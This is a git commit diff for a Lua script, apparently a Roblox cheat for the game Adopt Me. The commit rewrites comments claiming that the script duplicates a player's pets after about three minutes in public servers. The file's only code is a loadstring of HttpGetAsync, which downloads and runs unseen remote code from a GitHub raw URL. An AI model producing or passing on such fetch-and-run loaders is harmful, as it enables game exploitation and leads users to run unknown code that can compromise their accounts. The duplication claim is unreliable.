ae919e8eca0fb8d87700fa07c9db3ccae260d41e
Dalle2fan <108146390+Dalle2fan@users.noreply.github.com>
2024-11-07 15:29:33 -0500

    Update Dupe-Pets-Script.lua

--- Dupe-Pets-Script.lua
+++ Dupe-Pets-Script.lua
@@ -1,3 +1,6 @@
--- Run this script after you are fully loaded in Adopt me!
--- After running it, open backpack, then wait about 3 minutes for your pets to be duplicated! 
+--[[
+This script only works in public servers (since it got patched in private servers)
+After running it, open backpack, then wait about 3 minutes for your pets to be duplicated
+]]
+
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Dalle2fan/Scripts/main/Adopt-Me-Dupe-Script.lua"))()
